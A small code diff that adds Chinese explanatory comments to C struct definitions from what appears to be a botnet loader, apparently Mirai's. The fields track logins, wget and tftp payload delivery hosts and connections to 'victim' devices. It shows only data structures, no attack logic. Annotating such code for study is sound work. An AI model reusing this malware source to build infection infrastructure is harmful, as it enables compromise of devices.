@@ -10,7 +10,7 @@ struct server {
     volatile uint32_t curr_open;
     volatile uint32_t total_input, total_logins, total_echoes, total_wgets, total_tftps, total_successes, total_failures;
     char *wget_host_ip, *tftp_host_ip;
-    struct server_worker *workers;
+    struct server_worker *workers;  //指回server_worker的指针
     struct connection **estab_conns;
     ipv4_t *bind_addrs;
     pthread_t to_thrd;
@@ -20,9 +20,9 @@ struct server {
 };
 
 struct server_worker {
-    struct server *srv;
+    struct server *srv; //维护连接某个victim的信息
     int efd; // We create a separate epoll context per thread so thread safety isn't our problem
-    pthread_t thread;
+    pthread_t thread;   //对应的线程信息
     uint8_t thread_id;
 };
 
